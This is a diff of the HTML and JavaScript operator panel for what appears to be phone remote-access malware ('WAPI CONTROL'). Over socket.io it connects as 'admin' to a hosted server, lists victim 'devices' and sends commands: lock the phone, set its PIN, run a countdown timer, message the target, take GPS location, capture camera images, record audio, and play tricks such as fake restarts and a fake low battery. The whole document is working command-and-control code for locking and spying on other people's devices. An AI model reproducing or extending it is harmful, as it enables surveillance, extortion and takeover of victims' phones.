@@ -2,126 +2,154 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
     <title>WAPI CONTROL</title>
     <style>
         :root {
-            --bg: #0a0e0c;
-            --card: #0f1612;
-            --border: #1a3322;
-            --green: #00ff41;
-            --green-dim: #00cc33;
-            --text: #c0d6c0;
-            --text-dim: #5a7a5a;
-            --red: #ff3344;
-            --gold: #ffb800;
-            --blue: #00aaff;
-            --purple: #9944ff;
+            --bg: #000000; --card: #1c1c1e; --border: #2c2c2e; --red: #ff3b30; --orange: #ff9500;
+            --blue: #007aff; --green: #34c759; --purple: #af52de; --text: #ffffff; --text2: #8e8e93;
         }
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:10px;min-height:100vh;
-            background-image:radial-gradient(ellipse at top,rgba(0,255,65,.03),transparent 70%),
-            repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.01) 2px,rgba(0,255,65,.01) 4px)}
-        
-        .header{text-align:center;padding:14px 0;margin-bottom:8px}
-        .header h1{color:var(--green);font-size:22px;font-weight:800;letter-spacing:3px;text-shadow:0 0 20px rgba(0,255,65,.4)}
-        .header .sub{color:var(--text-dim);font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-top:2px}
-        
-        .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:8px;
-            box-shadow:0 0 15px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.02)}
-        .card h3{color:var(--green);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:2px;margin-bottom:8px;
-            display:flex;align-items:center;gap:6px}
-        .card h3::before{content:'';width:8px;height:8px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
-        
-        input{width:100%;padding:10px 14px;background:#0a0f0b;color:var(--green);border:1px solid var(--border);border-radius:8px;
-            font-size:11px;font-family:'JetBrains Mono',monospace;outline:none;transition:.2s}
-        input:focus{border-color:var(--green);box-shadow:0 0 10px rgba(0,255,65,.1)}
-        input::placeholder{color:#2a4a2a}
-        
-        button{padding:11px 8px;margin:2px;border:1px solid var(--border);border-radius:8px;font-weight:600;font-size:10px;
-            cursor:pointer;transition:all .2s;letter-spacing:1px;background:var(--card);color:var(--text)}
-        button:hover{border-color:var(--green);box-shadow:0 0 12px rgba(0,255,65,.1)}
-        button:active{transform:scale(.95)}
-        
-        .btn-green{background:#0a1a0d;color:var(--green);border-color:#1a4422}
-        .btn-green:hover{background:#0d220f;box-shadow:0 0 15px rgba(0,255,65,.2)}
-        .btn-red{background:#1a0a0d;color:var(--red);border-color:#441122}
-        .btn-red:hover{background:#220d0f;box-shadow:0 0 15px rgba(255,51,68,.2)}
-        .btn-gold{background:#1a120a;color:var(--gold);border-color:#44331a}
-        .btn-blue{background:#0a141a;color:var(--blue);border-color:#1a3344}
-        .btn-purple{background:#120a1a;color:var(--purple);border-color:#331a44}
-        
+        body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:12px;min-height:100vh}
+        .header{text-align:center;padding:20px 0 10px}
+        .header h1{font-size:26px;font-weight:700;letter-spacing:-1px;color:var(--red)}
+        .header .sub{font-size:12px;color:var(--text2);margin-top:2px}
+        .card{background:var(--card);border-radius:16px;padding:16px;margin-bottom:10px}
+        .card h3{font-size:13px;font-weight:600;color:var(--red);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
+        input{width:100%;padding:12px 16px;background:#2c2c2e;color:var(--text);border:none;border-radius:12px;font-size:14px;outline:none}
+        input::placeholder{color:var(--text2)}
+        button{padding:13px 10px;margin:3px;border:none;border-radius:12px;font-weight:600;font-size:12px;cursor:pointer;transition:opacity .2s}
+        button:active{opacity:.7}
+        .btn-red{background:var(--red);color:#fff}.btn-green{background:var(--green);color:#fff}
+        .btn-blue{background:var(--blue);color:#fff}.btn-orange{background:var(--orange);color:#fff}
+        .btn-purple{background:var(--purple);color:#fff}.btn-gray{background:#3a3a3c;color:var(--text)}
         .btn-full{width:100%}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:6px}
         .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px}
-        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:5px}
-        
-        .dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:6px}
-        .dot-on{background:var(--green);box-shadow:0 0 6px var(--green)}
-        .dot-off{background:var(--red);box-shadow:0 0 6px var(--red)}
-        
-        .target-item{background:#0d130f;padding:10px;border-radius:8px;margin:3px 0;cursor:pointer;border:1px solid #1a2a1e;
-            display:flex;justify-content:space-between;align-items:center;font-size:10px;transition:.2s}
-        .target-item:hover{border-color:var(--green);background:#0f1a11}
-        .target-item.active{border-color:var(--green);background:#0f1a11;box-shadow:0 0 10px rgba(0,255,65,.08)}
-        
-        hr{border:none;border-top:1px solid #1a2a1e;margin:8px 0}
-        #status{font-size:9px;color:var(--text-dim);margin-top:4px}
-        .active-target{color:var(--green);text-shadow:0 0 6px rgba(0,255,65,.3)}
+        .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px}
+        .dot-on{background:var(--green)}.dot-off{background:var(--red)}
+        .target-item{background:#2c2c2e;padding:12px;border-radius:12px;margin:4px 0;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-size:12px}
+        .target-item.active{background:#3a1a1a}
+        hr{border:none;border-top:1px solid var(--border);margin:10px 0}
+        #status{font-size:11px;color:var(--text2);margin-top:4px}
+        .active-target{color:var(--red);font-weight:600}
+        .status-bar{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:10px;font-size:9px}
+        .status-tag{padding:5px 10px;border-radius:10px;background:#2c2c2e;color:var(--text2)}
+        .status-tag.on{background:#1a2a1a;color:var(--green)}
+        .section-title{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin:8px 0 4px}
     </style>
 </head>
 <body>
 
 <div class="header">
     <h1>WAPI CONTROL</h1>
-    <div class="sub">cyber terminal &bull; real‑time panel</div>
+    <div class="sub">secure terminal &bull; real‑time</div>
 </div>
 
 <div class="card">
-    <h3>NODE</h3>
-    <input type="text" id="serverUrl" value="https://wafii.pythonanywhere.com" readonly>
-    <button class="btn-green btn-full" onclick="connect()" style="margin-top:6px">CONNECT</button>
-    <p id="status">disconnected</p>
+    <h3>SERVER</h3>
+    <input type="text" id="serverUrl" value="https://wafii.pythonanywhere.com">
+    <button class="btn-blue btn-full" onclick="connect()" style="margin-top:6px">Connect</button>
+    <p id="status">Disconnected</p>
 </div>
 
 <div class="card">
-    <h3>SESSIONS</h3>
-    <div id="targets"><p style="color:#3a5a3a;font-size:10px;">waiting for sessions...</p></div>
+    <h3>DEVICES</h3>
+    <div id="targets"><p style="color:var(--text2);font-size:11px;">Waiting for devices...</p></div>
 </div>
 
 <div class="card">
-    <h3>CONTROLS &mdash; <span id="activeLabel" class="active-target">no target</span></h3>
+    <h3>CONTROLS — <span id="activeLabel" class="active-target">No Device</span></h3>
     
+    <div class="status-bar" id="statusBar">
+        <span class="status-tag" id="sLock">LOCK</span>
+        <span class="status-tag" id="sSiren">ALARM</span>
+        <span class="status-tag" id="sVibe">VIBE</span>
+        <span class="status-tag" id="sFlash">STROBE</span>
+        <span class="status-tag" id="sWall">WALL</span>
+        <span class="status-tag" id="sMP3">MP3</span>
+    </div>
+    
+    <div class="section-title">Actions</div>
     <div class="grid-2">
-        <button class="btn-red btn-full" onclick="send('lock')">🔒 LOCK</button>
-        <button class="btn-green btn-full" onclick="send('unlock')">🔓 RELEASE</button>
+        <button class="btn-red" onclick="send('lock')">🔒 Lock</button>
+        <button class="btn-green" onclick="send('unlock')">🔓 Release</button>
     </div>
     <hr>
+    <input type="text" id="msgInput" placeholder="Pesan ke target...">
+    <button class="btn-blue btn-full" onclick="sendMsg()">📩 Kirim Pesan</button>
+    <hr>
+    <input type="text" id="timerInput" placeholder="Timer (detik)...">
+    <button class="btn-red btn-full" onclick="sendTimer()">⏱ Set Timer</button>
+    <hr>
+    <input type="text" id="pinInput" placeholder="Set PIN (4 digit)...">
+    <button class="btn-orange btn-full" onclick="sendPin()">🔑 Set PIN</button>
+    <hr>
     <div class="grid-3">
-        <button class="btn-red" onclick="send('siren')">🔊</button>
-        <button class="btn-blue" onclick="send('vibrate')">📳</button>
-        <button class="btn-gold" onclick="send('flash_on')">💡</button>
-        <button class="btn-gold" onclick="send('flash_off')">🌑</button>
-        <button class="btn-purple" onclick="send('wallpaper')">🖼</button>
-        <button class="btn-purple" onclick="send('mp3')">🎵</button>
-        <button class="btn-blue" onclick="send('gps')">📍</button>
-        <button class="btn-blue" onclick="send('camera')">📸</button>
-        <button class="btn-red" onclick="send('reset_password')">🔑</button>
+        <button class="btn-red" onclick="send('siren')">🔊 Alarm</button>
+        <button class="btn-blue" onclick="send('vibrate')">📳 Vibrate</button>
+        <button class="btn-orange" onclick="send('flash_on')">💡 Strobe</button>
+        <button class="btn-gray" onclick="send('flash_off')">🌑 Off</button>
+        <button class="btn-purple" onclick="send('wallpaper')">🖼 Wall</button>
+        <button class="btn-purple" onclick="send('mp3')">🎵 MP3</button>
+        <button class="btn-blue" onclick="send('gps')">📍 GPS</button>
+        <button class="btn-blue" onclick="send('camera')">📸 Cam</button>
+        <button class="btn-red" onclick="send('record')">🎤 Rec</button>
+    </div>
+    <hr>
+    <div class="section-title">Tools</div>
+    <div class="grid-2">
+        <button class="btn-orange" onclick="send('ghost')">👻 Ghost</button>
+        <button class="btn-red" onclick="send('popup')">💬 Popup</button>
+        <button class="btn-gray" onclick="send('battery_low')">🔋 Bat 1%</button>
+        <button class="btn-gray" onclick="send('screen_off')">📱 Off</button>
+        <button class="btn-gray" onclick="send('fake_restart')">🔄 Boot</button>
+        <button class="btn-gray" onclick="send('sos')">🆘 SOS</button>
     </div>
 </div>
 
 <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 <script>
 var s,ct=null,all=[];
+var states={lock:false,siren:false,vibe:false,flash:false,wall:false,mp3:false};
+
+function updateStatusBar(){
+    var tags=[
+        {id:'sLock',key:'lock',label:'LOCK'},
+        {id:'sSiren',key:'siren',label:'ALARM'},
+        {id:'sVibe',key:'vibe',label:'VIBE'},
+        {id:'sFlash',key:'flash',label:'STROBE'},
+        {id:'sWall',key:'wall',label:'WALL'},
+        {id:'sMP3',key:'mp3',label:'MP3'}
+    ];
+    tags.forEach(function(t){
+        var el=document.getElementById(t.id);
+        if(states[t.key]){el.textContent=t.label;el.className='status-tag on'}
+        else{el.textContent=t.label;el.className='status-tag'}
+    });
+}
+
 function connect(){
     var url=document.getElementById('serverUrl').value.trim();
     s=io(url,{query:{role:'admin'}});
-    document.getElementById('status').innerHTML='<span class="dot dot-on"></span> connected';
+    document.getElementById('status').innerHTML='<span class="dot dot-on"></span> Connected';
     s.on('targets',function(d){all=d;render()});
-    s.on('disconnect',function(){document.getElementById('status').innerHTML='<span class="dot dot-off"></span> disconnected'});
+    s.on('disconnect',function(){document.getElementById('status').innerHTML='<span class="dot dot-off"></span> Disconnected'});
 }
-function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#3a5a3a;font-size:10px;">no active sessions</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="dot '+(t.online?'dot-on':'dot-off')+'"></span><b>'+t.id+'</b></span><span style="color:#3a5a3a">▶</span></div>'}).join('')}
-function select(id){ct=id;document.getElementById('activeLabel').textContent=id;render()}
-function send(cmd){if(!s||!ct){alert('Select target!');return}s.emit('command',{targetId:ct,cmd:cmd})}
+function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:var(--text2);font-size:11px;">No devices</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="dot '+(t.online?'dot-on':'dot-off')+'"></span><b>'+t.id+'</b></span><span style="color:var(--text2)">▶</span></div>'}).join('')}
+function select(id){ct=id;document.getElementById('activeLabel').textContent=id;states={lock:false,siren:false,vibe:false,flash:false,wall:false,mp3:false};updateStatusBar();render()}
+function send(cmd){
+    if(!s||!ct){alert('Select device!');return}
+    s.emit('command',{targetId:ct,cmd:cmd});
+    if(cmd==='lock')states.lock=true;if(cmd==='unlock')states={lock:false,siren:false,vibe:false,flash:false,wall:false,mp3:false};
+    if(cmd==='siren')states.siren=true;if(cmd==='flash_on')states.flash=true;if(cmd==='flash_off')states.flash=false;
+    if(cmd==='vibrate')states.vibe=true;if(cmd==='wallpaper')states.wall=true;if(cmd==='mp3')states.mp3=true;
+    updateStatusBar();
+}
+function sendMsg(){var txt=document.getElementById('msgInput').value.trim();if(!txt||!s||!ct)return;s.emit('command',{targetId:ct,cmd:'message',text:txt})}
+function sendTimer(){var t=document.getElementById('timerInput').value.trim();if(!t||!s||!ct)return;s.emit('command',{targetId:ct,cmd:'timer',text:t})}
+function sendPin(){var p=document.getElementById('pinInput').value.trim();if(!p||!s||!ct)return;s.emit('command',{targetId:ct,cmd:'set_pin',text:p})}
+updateStatusBar();
 </script>
 </body>
 </html>
